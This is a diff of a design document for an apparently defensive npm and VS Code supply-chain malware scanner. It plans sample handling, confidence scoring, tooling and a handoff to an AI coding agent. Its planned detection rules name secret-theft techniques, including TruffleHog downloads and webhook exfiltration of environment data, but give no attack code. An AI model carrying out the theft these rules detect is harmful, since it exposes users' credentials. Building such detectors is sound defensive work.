-- **Type hints everywhere.** No `Any` types unless absolutely unavoidable.
-- **Docstrings on all public functions.** Google style.
-- **No classes where functions suffice.** Only use classes for plugins and data models.
-- **f-strings for formatting.** No `.format()` or `%` formatting.
-- **Path objects, not strings.** Use `pathlib.Path` throughout.
-- **Plugin LOC limit:** Each plugin scanner.py should be 200-300 lines max. If it's getting longer, refactor shared logic into `static_analysis.py`.
-- **Rule IDs are namespaced:** `NPM-XXX` for npm, `VSC-XXX` for vscode, `GH-XXX` for future git hooks.
-- **No print statements.** Use `logging` module or `rich.console` for output.
-- **Imports:** stdlib first, then third-party, then local. Sorted alphabetically within groups.
-
----
-
-## Future Decisions (Placeholder)
-
-- DEC-011: Git hooks plugin design (reserved)
-- DEC-012: GitHub Actions plugin design (reserved)
-- DEC-013: Threat intelligence feed integration (reserved)
-- DEC-014: GitHub Action packaging for CI/CD (reserved)
-- DEC-015: Plugin contribution guidelines and template (reserved)
-
----
-
-*Last updated: 2025-02-07*
-*Status: MVP scaffolding phase*
+Implementation: .gitignore entire samples/ directory, commit only neutered fixtures
+5.2 Metadata Format
+Decision: JSON for machine-readable, Markdown for human-readable
+Rationale:
+
+JSON for CI/automation (validate_samples.py output)
+Markdown for analyst review (gap reports, weekly summaries)
+CSV for time-series metrics (easy charting in spreadsheets)
+
+5.3 Rule Confidence Scoring
+Decision: Three-tier confidence (high/medium/low)
+Rationale:
+
+High: <0.1% FP rate, malware-specific patterns (campaign markers, TruffleHog downloads)
+Medium: <1% FP rate, legitimate uses exist but rare (webhook exfil + env access)
+Low: >1% FP rate, common patterns needing context (delayed execution)
+
+Usage: Users can filter alerts by confidence threshold
+5.4 OpenSourceMalware.com Integration
+Decision: Start with manual import, automate when API available
+Rationale:
+
+opensourcemalware.com API/download mechanism unclear from project instructions
+Manual workflow unblocks Phase 2 immediately
+Build abstraction layer (SampleFetcher class) for future API integration
+Weekly manual pulls sustainable for initial corpus building
+
+
+6. Open Questions for Implementation
+
+OpenSourceMalware.com Access:
+
+Do they have an API, or is it web UI only?
+Authentication required?
+Rate limits?
+Action: Research and document in implementation
+
+
+Multi-File Correlation:
+
+Does current plugin architecture support cross-file analysis?
+Need new plugin type or enhance existing?
+Action: Spike NPM-LC-006 feasibility in Week 3
+
+
+Metrics Visualization:
+
+Generate charts from CSV automatically?
+GitHub Actions integration for weekly reports?
+Action: Defer to Month 2 unless trivial
+
+
+
+
+7. Handoff to Claude Code
+File Modifications Required
+
+New files:
+
+tools/fetch_samples.py
+tools/validate_samples.py
+tools/gap_analysis.py
+tools/neuter_sample.py
+analysis/gap-reports/.gitkeep
+analysis/validation-reports/.gitkeep
+analysis/metrics/detection-rates.csv
+samples/.gitignore
+
+
+Rule updates (add metadata to existing + create new):
+
+rules/npm-lifecycle/trufflehog-download.yml (NEW - NPM-LC-001)
+rules/npm-lifecycle/github-actions-injection.yml (NEW - NPM-LC-002)
+rules/npm-lifecycle/campaign-markers.yml (NEW - NPM-LC-003)
+rules/npm-lifecycle/webhook-exfiltration.yml (NEW - NPM-LC-004)
+rules/npm-lifecycle/delayed-execution.yml (NEW - NPM-LC-005)
+
+
+Test additions:
+
+tests/test_tier1_rules.py (NEW - Tier 1 rule validation)
+tests/fixtures/malicious/ (neutered samples)
+
+
+Documentation:
+
+Update README.md with Phase 2 objectives
+Add docs/SAMPLE_TESTING.md (workflow guide)
+
+
+
+Implementation Priority Order
+
+Immediate (Week 1): fetch_samples.py, validate_samples.py, directory structure
+High (Week 2): NPM-LC-001, NPM-LC-002, NPM-LC-003 rules
+Medium (Week 3): gap_analysis.py, NPM-LC-004, NPM-LC-005
+Lower (Week 4): neuter_sample.py, NPM-LC-006 spike
+
+Coding Standards for Claude Code
+Type hints everywhere. No Any types unless absolutely unavoidable.
+Docstrings on all public functions. Google style.
+No classes where functions suffice. Only use classes for plugins and data models.
+f-strings for formatting. No .format() or % formatting.
+Path objects, not strings. Use pathlib.Path throughout.
+Plugin LOC limit: Each plugin scanner.py should be 200-300 lines max. If it's getting longer, refactor shared logic into static_analysis.py.
+Rule IDs are namespaced: NPM-XXX for npm, VSC-XXX for vscode, GH-XXX for future git hooks.
+No print statements. Use logging module or rich.console for output.
+Imports: stdlib first, then third-party, then local. Sorted alphabetically within groups.
